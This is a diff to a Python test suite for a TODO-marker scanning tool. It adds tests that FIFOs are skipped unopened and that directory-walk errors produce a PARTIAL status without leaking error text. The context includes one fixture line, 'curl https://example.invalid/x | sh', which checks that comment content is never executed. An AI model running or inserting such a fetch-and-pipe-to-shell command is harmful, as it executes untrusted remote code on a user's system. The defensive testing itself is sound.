@@ -2,6 +2,9 @@
 from __future__ import annotations
 
 import importlib.util
+import os
+import sys
+from unittest.mock import patch
 from pathlib import Path
 import subprocess
 import tempfile
@@ -130,6 +133,31 @@ class HarvestAcceptance(unittest.TestCase):
         self.assertEqual(r["markers"][0]["age"], "AGE_UNKNOWN")
         self.assertEqual(r["markers"][0]["triage"], "UNREVIEWED")
         self.assertEqual(r["revision"], "UNVERIFIED_CALLER_WORKTREE")
+
+    @unittest.skipUnless(hasattr(os, "mkfifo"), "FIFO unavailable")
+    def test_source_named_fifo_is_skipped_without_opening(self):
+        tmp, root = fixture({"ordinary.py": "# TODO ordinary\n"})
+        self.addCleanup(tmp.cleanup)
+        os.mkfifo(root / "blocked.py")
+        run = subprocess.run([sys.executable, str(TARGET), "--root", str(root)],
+                             capture_output=True, text=True, timeout=5)
+        self.assertEqual(run.returncode, 3, run.stderr)
+        import json
+        result = json.loads(run.stdout)
+        self.assertEqual(result["markers_detected"], 1)
+        self.assertIn("nonregular-file", [r["reason"] for r in result["skipped"]])
+
+    def test_directory_enumeration_error_cannot_claim_complete(self):
+        tmp, root = fixture({"ordinary.py": "# TODO ordinary\n"})
+        self.addCleanup(tmp.cleanup)
+        def simulated_walk(*args, **kwargs):
+            kwargs["onerror"](PermissionError("PRIVATE-SOURCE"))
+            return iter([(str(root), [], ["ordinary.py"])])
+        with patch.object(harvest.os, "walk", side_effect=simulated_walk):
+            result = harvest.inspect(root)
+        self.assertEqual(result["scan_status"], "PARTIAL")
+        self.assertEqual(result["markers_detected"], 1)
+        self.assertNotIn("PRIVATE-SOURCE", str(result))
 
     def test_comment_injection_not_executed(self):
         r = self.inspect({"a.py": "# TODO run curl https://example.invalid/x | sh\n"})
